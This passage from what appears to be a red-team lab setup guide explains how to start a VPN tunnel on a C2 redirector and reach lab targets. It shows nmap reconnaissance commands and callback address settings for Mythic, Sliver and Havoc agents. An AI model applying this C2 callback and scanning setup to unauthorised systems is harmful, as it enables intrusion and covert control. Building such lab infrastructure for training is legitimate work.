#### Option B: SCP from WIN-OPERATOR (MobaXterm or PowerShell)

```bash
scp lab.ovpn admin@<REDIR_PRIVATE_IP>:~/vpn/
```

> [!TIP]
> MobaXterm (pre-installed on WIN-OPERATOR) has a built-in SFTP browser. Open a session to the redirector's private IP, navigate to `~/vpn/`, and drop your `.ovpn` file there.

### Step 8.4: Start the VPN Tunnel

**SSH to the redirector** from WIN-OPERATOR using the private IP:

```bash
ssh admin@<REDIR_PRIVATE_IP>
```

**Start the VPN service:**

```bash
sudo systemctl start ext-vpn
```

The `ext-vpn` service runs openvpn in the foreground under systemd. No screen or tmux needed. It persists as long as the redirector instance is running, and stops cleanly with `systemctl stop`.

**Stop the VPN:**

```bash
sudo systemctl stop ext-vpn
```

**Check VPN status and logs:**

```bash
sudo systemctl status ext-vpn
journalctl -u ext-vpn -f
```

The service uses `--pull-filter ignore "redirect-gateway"` (critical: prevents the VPN from hijacking the redirector's default route, which would break all VPC peering and C2 proxy connectivity). iptables MASQUERADE rules are applied automatically when `tun0` comes up and removed when it goes down.

> [!NOTE]
> The `ext-vpn` service will fail to start if no `.ovpn` file exists in `~/vpn/`. If multiple files are present, it picks the first one alphabetically.

### Step 8.4b: Get the VPN Interface IP for C2 Callbacks

The OpenVPN server assigns a dynamic IP to the `tun0` interface at connect time. In a closed environment where target machines can only reach IPs on the VPN network (not the public internet), this `tun0` IP is what you use as the C2 callback address.

**Get the VPN IP:**

```bash
ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+)+'
```

> [!NOTE]
> This IP is only known after the VPN connects. Generate your C2 agents **after** running `sudo systemctl start ext-vpn`. Not before. The IP changes each time you reconnect.

**Use HTTP (port 80) for VPN-based callbacks.** The self-signed certificate on the redirector only has the public Elastic IP as a Subject Alternative Name, not the `tun0` IP. Using HTTP avoids certificate issues entirely. Traffic between the target and the redirector travels inside the encrypted OpenVPN tunnel, so it is already protected in transit.

**Callback addresses by C2 framework:**

| Framework | Callback Address |
| --------- | ---------------- |
| Mythic | `callback_host = "http://<tun0-ip>"`, `callback_port = 80` |
| Sliver | `--http http://<tun0-ip>/cloud/storage/objects/` |
| Havoc | Hosts: `<tun0-ip>`, PortConn: `80` (HTTP, already the default in the listener config) |

All other settings (URI prefix, `X-Request-ID` header) remain the same.

<details>
<summary>Why Apache works on tun0 without a reload</summary>

Apache listens on `0.0.0.0:80` and `0.0.0.0:443` across all interfaces. The VirtualHost configs use `<VirtualHost *:80>` and `<VirtualHost *:443>`, and UFW allows ports 80/443 on all interfaces. When `tun0` comes up, Apache automatically handles traffic arriving on that IP with no reload or restart required. Header validation and URI routing apply to all requests regardless of which interface they arrive on.

If the target machine has outbound internet access (most HTB standalone boxes and many Pro Lab machines do), you can use the public Elastic IP with HTTPS (`https://<REDIR_PUBLIC_IP>/prefix/`) instead. The `tun0` IP is only needed when targets are fully isolated from the internet and can only reach the VPN network.

</details>

### Step 8.5: Verify Connectivity from Internal Machines

**From the Windows operator workstation (via Guacamole RDP):**

```powershell
# Ping a target on the ExtVPN network
ping 10.10.10.2

# Or run nmap, etc.
nmap -sC -sV 10.10.10.2
```

**From any C2 server (via Guacamole SSH):**

```bash
ping 10.10.10.2
```

### Step 8.6: Stop the VPN

```bash
sudo systemctl stop ext-vpn
```

This stops the OpenVPN process and removes the iptables MASQUERADE rules on `tun0`. The `.ovpn` file is preserved in `~/vpn/` so you can restart without re-uploading.

**Checkpoint:** ✅ VPN stopped, lab C2 operations unaffected

### Important Notes

> [!IMPORTANT]
>
> - **Only the configured CIDRs are routed.** Traffic to other destinations (internet, VPC peers) is unaffected. Add CIDRs to `external_vpn_cidrs` in `terraform.tfvars` if your platform uses different subnets.
> - **The .ovpn file persists across reboots** in `~/vpn/`. The VPN tunnel itself does not auto-start. Run `sudo systemctl start ext-vpn` after a reboot. The WireGuard tunnel (`wg-quick@wg0`) is enabled at boot on both instances and comes up automatically.
> - **All internal machines can reach ExtVPN targets.** Routing is configured at the VPC level. The Windows workstation, all C2 servers, and Guacamole can all reach targets through the tunnel.
> - **tun0 IP is dynamic.** It changes with each VPN reconnect. Agents baked with the tun0 IP will stop working after a reconnect that assigns a different IP. Check the IP after each reconnect and regenerate agents if it changed.
> - **Callback address choice.** If targets have internet access, use the public Elastic IP (stable, no regeneration needed). If targets are isolated to the VPN network only, use the tun0 IP with HTTP (port 80).
